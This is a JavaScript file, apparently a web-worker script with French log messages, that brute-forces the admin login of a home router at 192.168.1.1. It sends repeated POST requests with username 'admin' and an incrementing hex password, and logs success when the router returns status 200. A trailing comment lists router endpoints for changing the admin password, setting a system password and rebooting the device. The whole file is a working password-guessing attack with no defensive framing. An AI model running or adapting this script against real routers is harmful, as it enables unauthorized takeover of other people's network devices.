var username="admin";
var password=3879679805;
var inter = 0;
var info = "Start !!!!";
var run = true;
var xss = 0;
//var infointer  = setInterval("Info()", 10);

/*
onmessage = function (event) {
    postMessage(info);
	//console.log('set:' + event.data);
	//inter = setInterval("Start()", 5);
};
*/
/*
function Info(inf){
	//console.log(info);
	postMessage(inf);
}
*/

function Start(){
	//var xss = 0;
	//while(xss < 10000){

		var url = 'http://192.168.1.1/authenticate?';
		var xhr = new XMLHttpRequest() 
		xhr.open('POST', url+"username="+username+"&password="+password.toString(16).toUpperCase(), true);
		xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
		xhr.setRequestHeader("Access-Control-Allow-Methods", "POST");
		//xhr.setRequestHeader("Access-Control-Allow-Headers", "X-custom");
		xhr.setRequestHeader("access-control-allow-credentials",  "true");
		xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		//xhr.setRequestHeader("Content-Type", "text/html; charset=utf-8");
		//xhr.setRequestHeader("", "text/html; charset=utf-8");
		//xhr.setRequestHeader("Content-Type", "text/plain");
		 //xhr.setRequestHeader('Accept','*/*');
		 //xhr.setRequestHeader("Accept-Language", "fr");
		 //xhr.withCredentials = true;
		 xhr.onreadystatechange = function do_something(){
			//alert("reponse=" + xhr.responseText)
			
			//if(this.readyState == this.HEADERS_RECEIVED) {
				//console.log("===" + xhr.getAllResponseHeaders()/*000000000getResponseHeader("set-cookie")*/);
				
				if(this.status == 200){
					console.log("Connecté. Username=" + username + " , Password=" + password.toString(16));
					Info("Connecté. Username=" + username + " , Password=" + password.toString(16));
					clearInterval(inter);
					
					run = false;
				}
				else{
					
					Info("Mauvais mot de passe. Username=" + username + " , Password=" + password.toString(16) + "[" + this.responseText + "]");
				}
		  }
			
		 xhr.send(/*"username="+username+"&password="+password.toString(16)*/);
		password++;
		 
		
	 
	//}
 
}


Start();

 /*
while(1){
	
	alert("Username=" + username + " , Password=" + password.toString(16));
	document.getElementById("Username").value = username;
	document.getElementById("Password").value = password.toString(16);
	
	document.getElementById("Login").submit();
	
	if(document.getElementById("emptyauthinvalid").value === "login ou mot de passe invalide"){
		password++;
		if(password == -1){
			return;
		}
	}
	
	

} 

//http://192.168.1.1/goform/formPasswordSetup?userMode=0&oldpass=1234&newpass=12345&confpass=12345&save=%22Apply%20Changes%22
http://192.168.1.1/password.cgi?sysPassword=adminregis
http://192.168.1.1/goform/admin/formReboot
http://192.168.1.1/authenticate?username=admin&password=adminregis */